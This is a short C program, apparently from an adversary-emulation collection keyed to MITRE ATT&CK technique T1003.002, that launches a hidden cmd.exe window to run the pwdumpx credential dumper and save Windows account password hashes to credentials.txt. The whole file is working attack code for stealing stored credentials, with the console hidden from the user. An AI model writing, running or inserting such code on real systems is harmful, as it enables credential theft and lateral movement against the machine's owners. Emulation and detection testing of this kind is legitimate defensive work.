// Link      = https://attack.mitre.org/techniques/T1003/002/
// Technique = OS Credential Dumping: Security Account Manager
// ID        = T1003.002
// Tactics   = Credential Access

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("pwdumpx.exe > credentials.txt");
    return 0;
}